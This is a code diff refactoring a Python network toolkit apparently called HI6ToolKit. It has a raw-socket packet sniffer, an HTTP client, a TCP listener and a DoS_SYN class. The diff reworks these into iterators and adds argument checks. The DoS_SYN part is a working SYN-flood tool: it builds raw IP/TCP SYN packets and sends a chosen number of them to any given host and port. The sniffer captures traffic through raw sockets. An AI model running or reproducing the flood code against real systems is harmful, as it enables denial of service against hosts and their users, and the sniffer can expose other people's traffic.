@@ -10,11 +10,10 @@ import argparse
 
 class Constant :
     MODULE : bool = __name__ != "__main__"
-    TIME : float = round(time.time())
-    WIN : bool = "win" in sys.platform.lower()
-    BLOCK : str = chr(47)
+    TIME : int = round(time.time())
+    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
+    SLASH : str = chr(47)
     SPACE : str = chr(32)
-    INPUT : str = "\nPress ENTER to continue...\n"
     TOOLS : dict = dict()
     INFO : str = f"""\n
         [System] : [{sys.platform.upper()}, {time.ctime()}]
@@ -24,7 +23,7 @@ class Constant :
         [GitHub] : [github.com/HI6Cypher]
         [Email] : [huaweisclu31@hotmail.com]\n\n"""
 
-    ERROR : str = lambda arg : f"Invalid argument : \"{arg}\"\nType : \"python HI6ToolKit.py --help or -h\""
+    ERROR : str = lambda arg : print(f"Invalid argument : \"{arg}\"\nType : \"python HI6ToolKit.py --help or -h\"", file = sys.stderr)
 
     EXCEPTION : None = lambda error : print(f"[!] Error : {error or None}", file = sys.stderr)
 
@@ -39,14 +38,20 @@ class Sniff :
     def __init__(self, host : str, proto : int) :
         self.host = host
         self.proto = proto
-        self.ordered = str()
-        self.raw_buffer = bytes()
+        self.generator = None
 
     def __repr__(self) :
         return f"{self.__class__} {self.__dict__}"
 
     def __str__(self) :
         return f"Sniff : \n\t{self.host}\n\t{self.proto}"
+
+    def __iter__(self) :
+        self.generator = self.sniff()
+        return self
+
+    def __next__(self) :
+        return next(self.generator)
 
     @staticmethod
     def ip_header(raw_payload : bytes) :
@@ -66,8 +71,7 @@ class Sniff :
         csm = hex(payload[7])
         src = socket.inet_ntop(socket.AF_INET, payload[8])
         dst = socket.inet_ntop(socket.AF_INET, payload[9])
-        return ver, ihl, tos, tln, idn, flg, \
-            oft, ttl, prt, csm, src, dst
+        return (ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst)
 
     @staticmethod
     def icmp_header(raw_payload : bytes) :
@@ -78,7 +82,7 @@ class Sniff :
         idn = payload[3]
         seq = payload[4]
         data = raw_payload[8:]
-        return typ, cod, csm, idn, seq, data
+        return (typ, cod, csm, idn, seq, data)
 
     @staticmethod
     def tcp_header(raw_payload : bytes) :
@@ -95,13 +99,19 @@ class Sniff :
         rst = (flg & 4) >> 2
         syn = (flg & 2) >> 1
         fin = flg & 1
-        flg = (urg, ack, psh, rst, syn, fin)
+        flg = {
+            "urg" : urg,
+            "ack" : ack,
+            "psh" : psh,
+            "rst" : rst,
+            "syn" : syn,
+            "fin" :fin
+                }
         win = payload[6]
         csm = hex(payload[7])
         urg = payload[8]
         data = raw_payload[oft:]
-        return src, dst, seq, acn, oft, flg, \
-            win, csm, urg, data
+        return (src, dst, seq, acn, oft, flg, win, csm, urg, data)
 
     @staticmethod
     def udp_header(raw_payload : bytes) :
@@ -111,101 +121,99 @@ class Sniff :
         tln = payload[2]
         csm = hex(payload[3])
         data = raw_payload[8:]
-        return src, dst, tln, csm, data
+        return (src, dst, tln, csm, data)
 
     @staticmethod
     def indent_data(data : bytes) :
         data = str(data).strip("b'\"")
         text = "\t\t\t"
-        for i in range(0, (len(data) // 50) + 1) :
-            text += data[i * 50 : (i * 50) + 50] + "\n\t\t\t"
+        for i in range(0, (len(data) // 64) + 1) :
+            text += data[i * 64 : (i * 64) + 64] + "\n\t\t\t"
         return text
 
     def __proto(self) :
-        if Constant.WIN and self.proto == socket.IPPROTO_TCP :
+        if not Constant.ISOS and self.proto == socket.IPPROTO_TCP :
             raise OSError("Can't use socket.IPPROTO_TCP")
-        elif not Constant.WIN and self.proto == socket.IPPROTO_RAW :
-            raise OSError("Can't use socket.IPPROTO_RAW")
         return self.proto
 
-    def __analysis_proto(self, iph : tuple) :
+    def parse_headers(self, data : bytes) :
+        parsed_header = str()
         t = "\n\t\t"
-        self.ordered += f"\n[*][Connection]{Constant.TIME:_^33}\n\n"
-        text = f"\tIPv4 Packet :{t}Version : {iph[0]}  Header Length : {iph[1]}  Time of Service : {iph[2]}"
-        text += f"{t}Total Length : {iph[3]}  Identification : {iph[4]}  Flags : {iph[5]}"
-        text += f"{t}Fragment Offset : {iph[6]}  TTL : {iph[7]}  Protocol : {iph[8]}"
-        text += f"{t}Checksum : {iph[9]}  Source : {iph[10]}  Destination : {iph[11]}"
-        self.ordered += text + "\n\n"
+        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data[:20])
+        parsed_header += f"\n[*][Connection]{Constant.TIME:_^33}\n\n"
+        text = f"\tIPv4 Packet :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
+        text += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
+        text += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
+        text += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
+        parsed_header += text + "\n\n"
 
-        if iph[8] == "ICMP" :
-            typ, cod, csm, idn, seq, data = self.icmp_header(self.raw_buffer[iph[1]:])
+        if prt == "ICMP" :
+            typ, cod, csm, idn, seq, data = self.icmp_header(data[ihl:])
             text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
-            self.ordered += text + "\n"
+            parsed_header += text + "\n"
 
-        elif iph[8] == "TCP" :
-            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.raw_buffer[iph[1]:])
+        elif prt == "TCP" :
+            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data[ihl:])
             text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
-            self.ordered += text + "\t"
-            text = f"URG:{flg[0]}  ACK:{flg[1]}  PSH:{flg[2]}{t}\tRST:{flg[3]}  SYN:{flg[4]}  FIN:{flg[5]}"
-            self.ordered += text + t
+            parsed_header += text + "\t"
+            text = f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}"
+            parsed_header += text + t
             text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
-            self.ordered += text
+            parsed_header += text
 
-        elif iph[8] == "UDP" :
-            src, dst, tln, csm, data = self.udp_header(self.raw_buffer[iph[1]:])
+        elif prt == "UDP" :
+            src, dst, tln, csm, data = self.udp_header(data[ihl:])
             text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
-            self.ordered += text + "\n"
-        return None
+            parsed_header += text + "\n"
+        return parsed_header
 
     def sniff(self) :
         try :
             if not Constant.MODULE :
                 print(Constant.INFO)
-                input(Constant.INPUT)
+                input("\nPress ENTER to continue...\n")
             while True :
-                self.__sniff()
-                yield self.ordered, self.raw_buffer
+                yield self.__sniff()
         except KeyboardInterrupt :
             exit(1)
-        except Exception as error :
-            if not Constant.MODULE : Constant.EXCEPTION(error)
-            return error
-        else :
-            return True
 
     def __sniff(self) :
         with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
             sniff.bind((self.host, 0))
             sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            if Constant.WIN : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
+            if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
             try :
                 while True :
-                    self.ordered = str()
-                    self.raw_buffer = sniff.recvfrom(65535)[0]
-                    if self.raw_buffer :
-                        iph = self.ip_header(self.raw_buffer[0:20])
-                        self.__analysis_proto(iph)
-                        self.ordered = self.ordered.expandtabs(4)
-                        Constant.SAVE(self.ordered)
-                        if Constant.WIN : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
-                        break
+                    raw_data = sniff.recvfrom(65535)[0]
+                    if raw_data :
+                        parsed_headers = self.parse_headers(raw_data)
+                        parsed_headers = parsed_headers.expandtabs(4)
+                        Constant.SAVE(parsed_headers)
+                        if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
+                        return parsed_headers
             except KeyboardInterrupt :
-                if Constant.WIN : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
+                if not Constant.ISOS : sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                 exit(1)
-        return None
 
 
 class DoS_SYN :
-    def __init__(self, host: str, port : int, rate : int) :
+    def __init__(self, host: str, port : int) :
         self.host = socket.gethostbyname(host)
         self.port = int(port)
-        self.rate = int(rate)
+        self.generator = None
 
     def __repr__(self) :
         return f"{self.__class__} {self.__dict__}"
 
     def __str__(self) :
         return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"
+
+    def __iter__(self) :
+        self.generator = self.flood()
+        return self
+
+    def __next__(self) :
+        return next(self.generator)
 
     @staticmethod
     def ip_header(src : str, dst : str,
@@ -227,7 +235,7 @@ class DoS_SYN :
                 ack : int = 0, psh : int = 0,
                 rst : int = 0, syn : int = 0,
                 fin : int = 0, win : int = 65535,
-                csm : int = 0, urp : int = 0) : #TODO bad header (wireshark)
+                csm : int = 0, urp : int = 0) :
         oft <<= 12
         res = 0 << 6
         flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
@@ -261,8 +269,6 @@ class DoS_SYN :
     def load_symbol(count : int, rate : int, char : str) :
         if count > rate :
             raise ValueError("\"count\" argument must be smaller than \"rate\"")
-        while rate % 32 != 0 :
-            rate += 1
         sec = rate >> 5
         return (count // sec) * char
 
@@ -287,46 +293,33 @@ class DoS_SYN :
         try :
             if not Constant.MODULE :
                 print(Constant.INFO)
-                input(Constant.INPUT)
-            self.__flood()
+                input("\nPress ENTER to continue...\n")
+            while True :
+                self.__flood()
+                yield None
         except KeyboardInterrupt :
             exit(1)
-        except Exception as error :
-            if not Constant.MODULE : Constant.EXCEPTION(error)
-            return error
-        else :
-            return True
 
     def __flood(self) :
-        socket_protocol = socket.IPPROTO_TCP if not Constant.WIN else socket.IPPROTO_IP
-        for i in range(1, self.rate + 1) :
-            payload = self.prepare()
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) as flood :
-                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                flood.connect((self.host, self.port))
-                flood.sendto(payload, (self.host, self.port))
-                flood.shutdown(socket.SHUT_RDWR)
-                if not Constant.MODULE : print(f"[+] {self.load_symbol(i, self.rate, Constant.BLOCK)}  {i} packets sent", end = "\r", flush = True)
-        else :
-            if not Constant.MODULE :
-                time.sleep(2)
-                end_time = round((time.time() - Constant.TIME), 2)
-                print("\n[+] All packets have sent")
-                print(f"[-] {end_time}s")
-        return None
+        payload = self.prepare()
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
+            flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            flood.connect((self.host, self.port))
+            flood.sendto(payload, (self.host, self.port))
+            flood.shutdown(socket.SHUT_RDWR)
+            return None
 
 
 class HTTP_Request :
-    def __init__(self, host : str, port : int, method : str, end : str, decode : bool, https : bool) :
+    def __init__(self, host : str, port : int, method : str, end : str, https : bool) :
         self.host = host
         self.port = int(port)
         self.method = method if method in ("GET", "HEAD") else "GET"
         self.end = end if end else "/"
-        self.decode = bool(decode) if not isinstance(decode, bool) else decode
-        self.https = bool(https) if not isinstance(https, bool) else https
+        self.https = bool(https)
         self.request_header = str()
         self.response = bytes()
-        self.response_header = bytes()
+        self.response_header = str()
 
     def __repr__(self) :
         return f"{self.__class__} {self.__dict__}"
@@ -338,19 +331,15 @@ class HTTP_Request :
         try :
             if not Constant.MODULE :
                 print(Constant.INFO)
-                input(Constant.INPUT)
+                input("\nPress ENTER to continue...\n")
             self.__request()
         except KeyboardInterrupt :
             exit(1)
-        except Exception as error :
-            if not Constant.MODULE : Constant.EXCEPTION(error)
-            return error
-        else :
-            return True
 
     def __request(self) :
         if self.https : sslcontext = ssl.create_default_context()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
+            http.settimeout(30)
             http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
             payload = [
                         f"{self.method} {self.end} HTTP/1.1",
@@ -362,31 +351,21 @@ class HTTP_Request :
             payload = "\r\n".join(payload)
             self.request_header = payload
             if not Constant.MODULE : print(payload)
-            http.settimeout(30)
             http.connect((self.host, self.port))
             http.send(payload.encode())
             raw_data = bytes()
-            if not Constant.MODULE :
-                count = 0
-                char = Constant.SPACE
-                switch = lambda x : Constant.BLOCK if x == Constant.SPACE else Constant.SPACE
             while True :
                 response = http.recv(1024)
                 if not response :
                     raw_data = raw_data.split(b"\r\n\r\n", 1)
                     self.response_header = raw_data[0]
-                    self.response = raw_data[-1].decode() if self.decode else raw_data[-1]
+                    self.response = raw_data[-1]
                     if not Constant.MODULE :
                         print(self.response_header, end = "\n\n")
                         if self.method == "GET" : print(self.response)
                     if self.https : http.close()
                     break
                 else :
-                    if not Constant.MODULE :
-                        count = count - 32 if count == 32 else count
-                        char = switch(char) if count == 0 else char
-                        print(f"{count * char}", end = "\r", flush = True)
-                        count += 1
                     raw_data += response
                     continue
         return None
@@ -395,9 +374,9 @@ class HTTP_Request :
 class Listen :
     def __init__(self, host : str, port : int, timeout : int, buffer : int) :
         self.host = host
-        self.port = int(port)
-        self.timeout = int(timeout)
-        self.buffer = int(buffer)
+        self.port = port
+        self.timeout = timeout
+        self.buffer = buffer
         self.data = bytes()
 
     def __repr__(self) :
@@ -410,31 +389,31 @@ class Listen :
         try :
             if not Constant.MODULE :
                 print(Constant.INFO)
-                input(Constant.INPUT)
+                input("\nPress ENTER to continue...\n")
             while True :
                 self.__listen()
                 yield self.data
-        except Exception as error :
-            if not Constant.MODULE : Constant.EXCEPTION(error)
-            return error
-        else :
-            return True
+        except KeyboardInterrupt :
+            exit(1)
 
-    def readbuffer(self, sock : socket.socket, buffer : int) :
+    @staticmethod
+    def readbuffer(sock : socket.socket, buffer : int) :
         payload = bytes()
         while len(payload) != buffer :
             payload += sock.recv(buffer - len(payload))
         else :
             return payload
 
-    def readline(self, sock : socket.socket) :
+    @staticmethod
+    def readline(sock : socket.socket) :
         line = bytes()
         while not line.endswith(b"\n") :
             line += sock.recv(1)
         else :
             return line
 
-    def get_length(self, header : bytes) :
+    @staticmethod
+    def get_length(header : bytes) :
         headers = header.split(b"\r\n")
         for header in headers :
             if header.startswith(b"Content-Length") :
@@ -442,7 +421,8 @@ class Listen :
         else :
             return 0
 
-    def tmp_file(self, file_name : str) :
+    @staticmethod
+    def tmp_file(file_name : str) :
         path = f"./{file_name}.tmp"
         mode = "xb" if os.path.exists(path) else "ab"
         return open(path, mode)
@@ -468,7 +448,7 @@ class Listen :
                             status, path, version = header.split(b"\r\n", 1)[0].split(b" ")
                             length = self.get_length(header) if status not in (b"GET", b"HEAD", b"CONNECT") else 0
                             self.data = header
-                            print(self.data)
+                            if not Constant.MODULE : print(self.data)
                         if length and status not in (b"GET", b"HEAD", b"CONNECT") :
                             conn.settimeout(5)
                             parts, tail = self.get_part(length)
@@ -493,15 +473,14 @@ if not Constant.MODULE :
     def manage_args() :
         parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
         parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, LISTEN]")
-        parser.add_argument("-m", "--method", type = str, help = "To specify method(proto) of tool")
-        parser.add_argument("-x", "--host", type = str, help = "To specify host")
-        parser.add_argument("-p", "--port", type = int, help = "To specify port")
-        parser.add_argument("-s", "--secure", action = "store_true", help = "To specify secure socket")
-        parser.add_argument("-d", "--decode", action = "store_true", help = "To specify decode boolean")
-        parser.add_argument("-e", "--endpoint", type = str, help = "To specify endpoint")
-        parser.add_argument("-r", "--rate", type = int, help = "To specify rate")
-        parser.add_argument("-t", "--time", type = int, help = "To specify timeout")
-        parser.add_argument("-b", "--buffer", type = int, help = "To specify recv() or recvfrom() bufferSize")
+        parser.add_argument("-m", "--method", type = str, help = "sets protocol type")
+        parser.add_argument("-x", "--host", type = str, help = "sets host")
+        parser.add_argument("-p", "--port", type = int, help = "sets port")
+        parser.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)")
+        parser.add_argument("-e", "--endpoint", type = str, help = "sets endpoint")
+        parser.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
+        parser.add_argument("-t", "--time", type = int, help = "sets timeout")
+        parser.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)")
         args = parser.parse_args()
         return args
 
@@ -510,9 +489,15 @@ if not Constant.MODULE :
             Constant.TOOLS[tool] = func
         return commit
 
-    def invalid_args(arg) :
-        print(Constant.ERROR(arg), file = sys.stderr)
+    def invalid_args(arg : str) :
+        Constant.ERROR(arg)
         return exit(1)
+
+    def check(**kwargs) :
+        nones = list()
+        for k, v in kwargs.items() :
+            if not v : nones.append(k)
+        return (True, nones) if not nones else (False, nones)
 
     @command(tool = "INFO")
     def info_args() :
@@ -522,57 +507,89 @@ if not Constant.MODULE :
     @command(tool = "SNIFF")
     def Sniff_args() :
         global args
-        host = args.host
-        proto = args.method
+        args = {
+            "host" : args.host,
+            "proto" : args.method
+            }
+        success, nones = check(**args)
+        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
         protos = {
-            "ALL" : socket.IPPROTO_RAW if not Constant.WIN else socket.IPPROTO_IP,
             "TCP" : socket.IPPROTO_TCP,
             "UDP" : socket.IPPROTO_UDP,
             "ICMP" : socket.IPPROTO_ICMP
         }
-        if proto.upper() not in protos : invalid_args(proto)
-        host = host if host else socket.gethostbyname(socket.gethostname())
-        sniff = Sniff(host, protos[proto.upper()])
-        gen = sniff.sniff()
-        for i in gen :
-            print(i[0])
+        if args["proto"].upper() not in protos : invalid_args(proto)
+        host = args["host"]
+        proto = protos[args["proto"].upper()]
+        sniff = Sniff(host, proto)
+        for packet in sniff :
+            print(packet)
         return None
 
     @command(tool = "DOS")
     def DoS_SYN_args() :
         global args
-        host = args.host
-        port = args.port
-        rate = args.rate
-        host = host if host else socket.gethostbyname(socket.gethostname())
-        flood = DoS_SYN(host, port, rate)
-        flood.flood()
+        args = {
+            "host" : args.host,
+            "port" : args.port,
+            "rate" : args.rate
+            }
+        success, nones = check(**args)
+        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
+        host = args["host"]
+        port = args["port"]
+        rate = args["rate"]
+        while rate % 32 != 0 : rate += 1
+        flood = DoS_SYN(host, port)
+        flood = iter(flood)
+        for i in range(1, rate + 1) :
+            next(flood)
+            if not Constant.MODULE : print(f"[+] {DoS_SYN.load_symbol(i, rate, Constant.SLASH)}  {i} packets sent", end = "\r", flush = True)
+        else :
+            if not Constant.MODULE :
+                time.sleep(2)
+                end_time = round((time.time() - Constant.TIME), 2)
+                print("\n[+] All packets have sent")
+                print(f"[-] {end_time}s")
+
         return None
 
     @command(tool = "HTTP")
     def HTTP_Request_args() :
         global args
-        host = args.host
-        port = args.port
-        method = args.method
-        secure = args.secure
-        endpoint = args.endpoint
-        decode = args.decode
-        port = port if port else 443 if secure else 80
-        host = host if host else socket.gethostbyname(socket.gethostname())
-        method = method if method.upper() in ("GET", "HEAD") else "GET"
-        client = HTTP_Request(host, port, method.upper(), endpoint, decode, secure)
+        args = {
+            "host" : args.host,
+            "port" : args.port,
+            "method" : args.method,
+            "endpoint" : args.endpoint,
+            "secure" : args.secure
+            }
+        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
+        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
+        host = args["host"]
+        port = args["port"] if args["port"] else 443 if args["secure"] else 80
+        method = args["method"].upper()
+        path = args["endpoint"]
+        secure = args["secure"]
+        client = HTTP_Request(host, port, method, path, secure)
         client.request()
         return None
 
     @command(tool = "LISTEN")
     def Listen_args() :
         global args
-        host = args.host
-        port = args.port
-        timeout = args.time
-        buffer = args.buffer
-        host = host if host else "127.0.0.1"
+        args = {
+            "host" :  args.host,
+            "port" : args.port,
+            "timeout" :  args.time,
+            "buffer" : args.buffer
+            }
+        success, nones = check(**args)
+        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
+        host = args["host"]
+        port = args["port"]
+        timeout = args["timeout"]
+        buffer = args["buffer"]
         listen = Listen(host, port, timeout, buffer)
         gen = listen.listen()
         for i in gen :
@@ -585,9 +602,9 @@ if not Constant.MODULE :
         args = manage_args()
         if args.Tool.upper() in Constant.TOOLS :
             try :
-               Constant.TOOLS[args.Tool.upper()]()
+                Constant.TOOLS[args.Tool.upper()]()
             except Exception as error:
-                invalid_args(error or "Not found required arguments")
+                invalid_args(error)
         else :
             invalid_args(args.Tool.upper())
         return True
